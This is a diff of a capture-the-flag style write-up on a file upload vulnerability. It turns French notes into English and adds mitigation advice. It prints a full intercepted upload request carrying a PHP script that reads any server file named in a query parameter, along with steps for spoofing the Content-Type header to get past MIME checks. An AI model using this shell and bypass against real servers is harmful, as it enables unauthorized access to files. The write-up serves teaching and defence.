@@ -1,11 +1,18 @@
-The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
+# Write-Up: File Upload Exploit
 
+## Exploit Overview
 
-Il faut intercepter la requete Post pour upload l'image et changer 
-Content-Type: application/x-php
-par 
-Content-Type: image/jpeg
+The vulnerability exploited here is related to insecure file upload handling. By intercepting the POST request used to upload a file, we can modify the `Content-Type` header to bypass weak MIME type validation on the server.
 
+### Steps to Exploit
+
+1. Intercept the POST request for file upload using a tool like Burp Suite or similar.
+2. Change the `Content-Type` from `application/x-php` (indicating a PHP script) to `image/jpeg` (indicating an image file).
+3. Submit the modified request.
+
+Here is the intercepted and modified POST request:
+
+```
 POST /?page=upload HTTP/1.1
 Host: 192.168.1.33
 Content-Length: 597
@@ -27,37 +34,55 @@ Content-Disposition: form-data; name="MAX_FILE_SIZE"
 100000
 ------WebKitFormBoundaryNHtXWgyPKt1jS4A8
 Content-Disposition: form-data; name="uploaded"; filename="test.php"
-Content-Type: application/x-php
+Content-Type: application/x-php (!!!ICI!!!)
 
 <?php
 if (isset($_GET['file'])) {
-    echo "<pre>";
     echo file_get_contents($_GET['file']);
-    echo "</pre>";
 } else {
     echo "Veuillez fournir un fichier avec ?file=chemin_du_fichier.";
 }
 ?>
-
 
 ------WebKitFormBoundaryNHtXWgyPKt1jS4A8
 Content-Disposition: form-data; name="Upload"
 
 Upload
 ------WebKitFormBoundaryNHtXWgyPKt1jS4A8--
+```
+
+### Explanation
+
+1. The `Content-Type` was modified from `application/x-php` to `image/jpeg`.
+2. The uploaded file, while disguised as an image, contains executable PHP code.
+3. If the server does not properly validate the file type and executes the script, the payload is successful.
+
+## Vulnerability Description
+
+This vulnerability arises from insufficient validation of user-uploaded files. While the application performs some checks, they are based solely on the MIME type provided in the HTTP headers, which can be easily manipulated.
+
+### Key Points
+
+- **Manipulable MIME Type:** The `Content-Type` header in the HTTP request can be manually altered.
+- **Insufficient Server Validation:** The server does not validate the actual file content or extension.
+- **Potential for Code Execution:** The uploaded file can execute malicious code, leading to unauthorized access or further exploitation.
+
+## Mitigation Strategies
+
+To prevent this type of attack, consider implementing the following measures:
+
+1. **Server-Side Validation:**
+
+   - Verify file extensions and MIME types.
+   - Perform content inspection of the uploaded file to ensure it matches the expected format.
+
+2. **Restrict Executable File Uploads:**
+
+   - Block potentially dangerous file types like `.php`, `.exe`, `.js`, etc.
+
+3. **File Storage:**
+
+   - Store uploaded files in a directory that is not web-accessible.
+   - Rename uploaded files to remove any executable extensions.
 
 
----------------------------------------------------------------------
-Le type de vulnérabilité exploité ici est lié à l'upload de fichier non sécurisé.
-Description :
-
-Dans ce cas, l'application web accepte des fichiers uploadés par l'utilisateur, mais ne valide pas correctement le type MIME du fichier. Bien qu'une vérification soit effectuée pour s'assurer que les fichiers sont des images, cette vérification repose uniquement sur le type MIME indiqué dans l'en-tête HTTP, qui peut être falsifié. En conséquence, un fichier malveillant comme un script PHP peut être déguisé en image en modifiant le type MIME (Content-Type).
-
-Lors de l'upload, l'application suppose que le fichier est une image (par exemple, image/jpeg), mais le contenu réel est un script PHP. Si ce fichier est ensuite accessible via le serveur et interprété comme du code, il peut être utilisé pour exécuter des commandes malveillantes, accéder à des fichiers sensibles, ou obtenir un accès non autorisé au serveur.
-Points clés :
-
-    Type MIME manipulable : L'en-tête Content-Type peut être modifié manuellement pour tromper le serveur.
-    Vérification insuffisante côté serveur : L'application ne valide pas correctement le contenu ou l'extension réelle du fichier.
-    Exécution de code malveillant : Une fois uploadé, le fichier peut être utilisé pour exécuter des commandes sur le serveur.
-
-Ce type de vulnérabilité est courant lorsque les développeurs ne mettent pas en œuvre des validations robustes sur les fichiers uploadés.
